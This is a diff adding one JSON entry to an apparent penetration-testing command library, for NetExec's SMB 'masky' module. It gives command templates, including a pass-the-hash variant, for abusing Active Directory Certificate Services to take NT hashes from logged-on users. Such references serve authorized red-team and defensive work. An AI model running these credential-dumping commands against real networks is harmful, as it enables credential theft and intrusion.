@@ -1,0 +1,31 @@
+{
+  "id": "nxc-smb-masky",
+  "name": "NetExec SMB Masky",
+  "command": "nxc smb '<ip>' -u '<user>' -p '<password>' -M masky -o CA='<ca_server>\\<ca_name>'",
+  "description": "Abuse ADCS to request certificates for all logged-on users and extract their NT hashes",
+  "platform": "linux",
+  "requires": [
+    "password"
+  ],
+  "protocols": [
+    "smb"
+  ],
+  "tags": [
+    "nxc",
+    "smb",
+    "masky",
+    "adcs",
+    "certificate",
+    "credential-dumping"
+  ],
+  "variations": [
+    {
+      "label": "NTLM Hash",
+      "requires": "hash",
+      "command": "nxc smb '<ip>' -u '<user>' -H '<hash>' -M masky -o CA='<ca_server>\\<ca_name>'"
+    }
+  ],
+  "examples": [
+    "nxc smb '192.168.1.100' -u 'user' -p 'password' -M masky -o CA='ca01.corp.local\\CORP-CA'"
+  ]
+}
